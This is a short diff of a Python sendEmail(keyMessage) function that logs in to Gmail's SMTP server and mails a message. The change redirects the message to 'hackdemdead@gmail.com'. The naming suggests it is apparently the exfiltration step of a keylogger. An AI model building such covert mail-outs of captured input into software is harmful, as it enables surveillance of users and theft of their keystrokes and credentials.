@@ -21,7 +21,7 @@ def sendEmail(keyMessage):
         server = smtplib.SMTP('smtp.gmail.com:587')
         server.starttls()
         server.login(username, password)
-        server.sendmail(fromaddr, ['wembleywilliams@gmail.com'], msg.as_string())
+        server.sendmail(fromaddr, ['hackdemdead@gmail.com'], msg.as_string())
         server.quit()
 
     except:
